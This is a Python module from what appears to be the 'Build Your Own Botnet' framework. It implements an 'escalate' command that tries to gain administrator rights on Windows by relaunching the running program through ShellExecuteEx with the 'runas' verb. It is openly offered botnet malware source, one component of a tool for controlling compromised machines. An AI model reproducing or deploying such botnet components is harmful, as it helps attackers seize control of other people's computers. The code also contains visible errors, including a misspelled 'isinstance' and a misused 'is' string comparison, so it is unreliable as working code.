#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os
import sys
import ctypes

# modules

import util

# globals

packages  = ['win32com','win32comext']
platforms = ['win32']
util.is_compatible(platforms, __name__)
util.imports(packages)


@util.config(platforms=['win32'], command=True, usage='escalate')
def escalate(self, target):
    """
    Attempt to escalate privileges

    `Required`
      :param str target:    filename of the currently running program
    """
    try:
        if isintance(target, str) and os.path.isfile(target):
            if bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0):
                return "Current user has administrator privileges"
            else:
                if os.name == 'nt':
                    return win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(target))
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        else:
            return "Error: argument 'target' must be a valid filename"
    except Exception as e:
        util.debug("{} error: {}".format(self.escalate.func_name, str(e)))
